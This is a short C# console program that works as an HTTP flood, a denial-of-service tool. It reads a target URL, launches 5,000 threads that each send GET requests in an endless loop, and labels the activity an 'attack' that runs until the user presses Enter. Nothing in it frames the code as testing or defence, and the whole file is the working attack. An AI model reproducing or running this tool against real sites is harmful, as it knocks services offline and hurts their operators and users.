class Program
{
    private static readonly HttpClient _client = new HttpClient();
    private static int pcBlocks = 5000;
    private static readonly object consoleLock = new object();

    public static void Main()
    {
        Console.Write("Please enter URL: ");
        string url = Console.ReadLine()!;
        Run(url);
    }

    public static void Run(string url)
    {
        using (ManualResetEventSlim waitHandle = new ManualResetEventSlim(false))
        {
            for (int i = 1; i <= pcBlocks; i++)
            {
                Thread thread = new Thread(() => Attack(url, i, waitHandle));
                thread.Start();
            }

            Console.WriteLine("Press Enter to stop the attack...");
            Console.ReadLine();
            waitHandle.Set();
            Console.WriteLine("Attack stopped.");
        }
    }

    public static void Attack(string url, int pcblockNumber, ManualResetEventSlim waitHandle)
    {
        while (!waitHandle.IsSet)
        {
            try
            {
                HttpRequestMessage request = new HttpRequestMessage()
                {
                    Method = HttpMethod.Get,
                    RequestUri = new Uri(url)
                };
                var result = _client.SendAsync(request).Result;

                lock (consoleLock)
                {
                    Console.WriteLine(pcblockNumber + "-pc received -> " + result.StatusCode);
                }
            }
            catch (Exception ex)
            {
                lock (consoleLock)
                {
                    Console.WriteLine(pcblockNumber + "-pc error: " + ex.Message);
                }
            }
        }
    }
}



